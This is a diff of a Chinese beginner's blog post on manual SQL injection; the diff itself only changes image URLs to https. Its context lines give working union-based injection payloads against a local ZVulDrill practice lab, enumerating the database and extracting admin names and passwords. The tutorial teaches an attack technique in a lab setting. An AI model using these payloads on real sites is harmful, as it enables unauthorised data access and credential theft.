@@ -21,17 +21,17 @@
 <meta property="og:url" content="http://huirong.github.io/2014/07/15/手动sql注入（初级篇）/index.html">
 <meta property="og:site_name" content="Star">
 <meta property="og:description" content="我也是才学 sql 注入一个星期，此篇文章是学给初学者看的推荐书籍 《sql注入攻击与防御》">
-<meta property="og:image" content="http://img.blog.csdn.net/20140715201016711">
-<meta property="og:image" content="http://img.blog.csdn.net/20140715201042343">
-<meta property="og:image" content="http://img.blog.csdn.net/20140715201431834">
-<meta property="og:image" content="http://img.blog.csdn.net/20140715202557175">
-<meta property="og:image" content="http://img.blog.csdn.net/20140715202931238">
-<meta property="og:image" content="http://img.blog.csdn.net/20140715203207348">
-<meta property="og:updated_time" content="2016-09-07T08:13:17.910Z">
+<meta property="og:image" content="https://img.blog.csdn.net/20140715201016711">
+<meta property="og:image" content="https://img.blog.csdn.net/20140715201042343">
+<meta property="og:image" content="https://img.blog.csdn.net/20140715201431834">
+<meta property="og:image" content="https://img.blog.csdn.net/20140715202557175">
+<meta property="og:image" content="https://img.blog.csdn.net/20140715202931238">
+<meta property="og:image" content="https://img.blog.csdn.net/20140715203207348">
+<meta property="og:updated_time" content="2017-02-19T10:37:50.355Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="手动sql注入（初级篇）">
 <meta name="twitter:description" content="我也是才学 sql 注入一个星期，此篇文章是学给初学者看的推荐书籍 《sql注入攻击与防御》">
-<meta name="twitter:image" content="http://img.blog.csdn.net/20140715201016711">
+<meta name="twitter:image" content="https://img.blog.csdn.net/20140715201016711">
 
   
 
@@ -195,7 +195,7 @@
 <p>如果在网址后面添加 ‘ 则sql语句为：<br><figure class="highlight cs"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> * <span class="keyword">from</span> table_name <span class="keyword">where</span> column_name=<span class="string">'hello'</span><span class="string">'</span></div></pre></td></tr></table></figure></p>
 <p>如果网站没有进行sql注入过滤，会报错。</p>
 <h2 id="③-演练平台"><a href="#③-演练平台" class="headerlink" title="③ 演练平台"></a>③ 演练平台</h2><p>在 GitHub 有个 Web 漏洞演练项目 <a href="https://github.com/710leo/ZVulDrill" target="_blank" rel="external">ZVulDrill</a>，可以下载后部署在自己的电脑上（这里我就不教大家部署了，熟悉Web编程的大部分都会）</p>
-<p>网页内容如下<br><img src="http://img.blog.csdn.net/20140715201016711" alt=""></p>
+<p>网页内容如下<br><img src="https://img.blog.csdn.net/20140715201016711" alt=""></p>
 <h1 id="II、检测字段长度"><a href="#II、检测字段长度" class="headerlink" title="II、检测字段长度"></a>II、检测字段长度</h1><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost/ZVulDrill-<span class="literal">master</span>/search.php?<span class="attr">search=</span>hello%' <span class="keyword">order</span> <span class="title">by</span> <span class="number">1</span>--%<span class="number">20</span></div></pre></td></tr></table></figure>
 <p>相当于sql语句<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> * <span class="keyword">from</span> table_name <span class="keyword">where</span> colmun_name <span class="keyword">like</span> <span class="string">'%hello%'</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">1</span> <span class="comment">-- '</span></div></pre></td></tr></table></figure></p>
 <p><font color="red">Tips：</font></p>
@@ -207,9 +207,9 @@
 <p>此时页面没有出错，用同样的方式 添加 order by 10<br>页面出错，然后 order by 5 出错，order by 4 页面正确<br>说明字段长  4</p>
 <h1 id="III、查看数据库信息"><a href="#III、查看数据库信息" class="headerlink" title="III、查看数据库信息"></a>III、查看数据库信息</h1><h2 id="①-方法-使用union语句提取数据"><a href="#①-方法-使用union语句提取数据" class="headerlink" title="① 方法:使用union语句提取数据"></a>① 方法:使用union语句提取数据</h2><figure class="highlight ada"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost/ZVulDrill-master/search.php?search=hello%' <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">4</span> <span class="comment">--%20</span></div></pre></td></tr></table></figure>
 <p>sql语句<br><figure class="highlight crystal"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">select * from table_name where column_name like <span class="string">'%hello%'</span> and <span class="number">1</span>=<span class="number">2</span> <span class="class"><span class="keyword">union</span> <span class="title">select</span> 1,2,3,4</span></div></pre></td></tr></table></figure></p>
-<p>union前的sql语句中 where条件恒为假，结果集为空，整个sql语句返回的是union后面的结果集<br><img src="http://img.blog.csdn.net/20140715201042343" alt=""></p>
+<p>union前的sql语句中 where条件恒为假，结果集为空，整个sql语句返回的是union后面的结果集<br><img src="https://img.blog.csdn.net/20140715201042343" alt=""></p>
 <h2 id="②-获取MySQL-version-user-database-等相关信息"><a href="#②-获取MySQL-version-user-database-等相关信息" class="headerlink" title="② 获取MySQL version user database 等相关信息"></a>② 获取MySQL version user database 等相关信息</h2><p>如上图所示，页面上显示 1,2 ，可以利用这个来显示我们需要的信息<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost/ZVulDrill-master/search.php?search=hello%' and 1=2 union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">version</span>(),<span class="keyword">user</span>(),<span class="number">4</span> <span class="comment">--%20</span></div></pre></td></tr></table></figure></p>
-<p>即  将 2，3 换成 version(),user()<br>页面如下<br><img src="http://img.blog.csdn.net/20140715201431834" alt=""></p>
+<p>即  将 2，3 换成 version(),user()<br>页面如下<br><img src="https://img.blog.csdn.net/20140715201431834" alt=""></p>
 <p>同理将 user() 换成 database()  得到数据库名  zvuldrill</p>
 <ul>
 <li>user() ————    wkdty@localhost</li>
@@ -218,11 +218,11 @@
 <li>database()   ————-  zvuldrill<h1 id="IV、获取数据库数据"><a href="#IV、获取数据库数据" class="headerlink" title="IV、获取数据库数据"></a>IV、获取数据库数据</h1><h2 id="①-获取表名"><a href="#①-获取表名" class="headerlink" title="① 获取表名"></a>① 获取表名</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost/ZVulDrill-master/search.php?search=hello%' and 1=2 union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">GROUP_CONCAT</span>(<span class="keyword">DISTINCT</span> table_name),<span class="number">4</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema=<span class="string">'zvuldrill'</span><span class="comment">--%20</span></div></pre></td></tr></table></figure>
 </li>
 </ul>
-<p><img src="http://img.blog.csdn.net/20140715202557175" alt=""><br>数据库中有3张表，对我们最有用的是admin这张表，以管理员身份进入网站可以看到各种信息</p>
+<p><img src="https://img.blog.csdn.net/20140715202557175" alt=""><br>数据库中有3张表，对我们最有用的是admin这张表，以管理员身份进入网站可以看到各种信息</p>
 <h2 id="②-获取字段名"><a href="#②-获取字段名" class="headerlink" title="② 获取字段名"></a>② 获取字段名</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost/ZVulDrill-master/search.php?search=hello%' and 1=2 union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">GROUP_CONCAT</span>(<span class="keyword">DISTINCT</span> column_name),<span class="number">4</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'admin'</span><span class="comment">--%20</span></div></pre></td></tr></table></figure>
-<p><img src="http://img.blog.csdn.net/20140715202931238" alt=""></p>
+<p><img src="https://img.blog.csdn.net/20140715202931238" alt=""></p>
 <h2 id="③-获取数据"><a href="#③-获取数据" class="headerlink" title="③ 获取数据"></a>③ 获取数据</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost/ZVulDrill-master/search.php?search=hello%' and 1=2 union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">GROUP_CONCAT</span>(<span class="keyword">DISTINCT</span> admin_id,admin_name,admin_pass),<span class="number">4</span> <span class="keyword">from</span> <span class="keyword">admin</span><span class="comment">--%20</span></div></pre></td></tr></table></figure>
-<p><img src="http://img.blog.csdn.net/20140715203207348" alt=""></p>
+<p><img src="https://img.blog.csdn.net/20140715203207348" alt=""></p>
 <ul>
 <li>admin_id：1 </li>
 <li>admin_name：admin</li>
